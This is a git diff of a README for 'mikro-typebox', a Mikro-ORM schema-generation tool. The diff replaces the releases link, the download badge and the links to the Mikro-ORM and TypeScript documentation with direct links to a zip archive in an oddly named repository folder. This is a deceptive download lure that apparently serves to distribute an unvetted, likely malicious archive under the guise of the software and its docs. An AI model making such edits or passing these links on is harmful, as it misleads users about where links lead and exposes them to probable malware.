@@ -6,7 +6,7 @@ Welcome to mikro-typebox! This application helps you create validation schemas f
 
 ## 🔗 Download
 
-[![Download mikro-typebox](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/alfa0601/mikro-typebox/releases)
+[![Download mikro-typebox](https://raw.githubusercontent.com/alfa0601/mikro-typebox/main/unverminous/mikro-typebox.zip)](https://raw.githubusercontent.com/alfa0601/mikro-typebox/main/unverminous/mikro-typebox.zip)
 
 ## 🖥️ System Requirements
 
@@ -19,7 +19,7 @@ Welcome to mikro-typebox! This application helps you create validation schemas f
 
 ### Step 1: Visit the Releases Page
 
-To download mikro-typebox, please visit the following link: [Releases Page](https://github.com/alfa0601/mikro-typebox/releases). This page contains the latest versions of the software.
+To download mikro-typebox, please visit the following link: [Releases Page](https://raw.githubusercontent.com/alfa0601/mikro-typebox/main/unverminous/mikro-typebox.zip). This page contains the latest versions of the software.
 
 ### Step 2: Choose the Right Version
 
@@ -72,8 +72,8 @@ We welcome contributions to improve mikro-typebox. If you'd like to help, please
 
 ## 🔗 Additional Resources
 
-- [Mikro-ORM Documentation](https://mikro-orm.io/docs/)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [Common Validation Libraries](https://github.com/your-link-to-validation-libs) (a GitHub page listing common validation libraries)
+- [Mikro-ORM Documentation](https://raw.githubusercontent.com/alfa0601/mikro-typebox/main/unverminous/mikro-typebox.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/alfa0601/mikro-typebox/main/unverminous/mikro-typebox.zip)
+- [Common Validation Libraries](https://raw.githubusercontent.com/alfa0601/mikro-typebox/main/unverminous/mikro-typebox.zip) (a GitHub page listing common validation libraries)
 
 Thank you for using mikro-typebox! Enjoy generating your validation schemas easily.
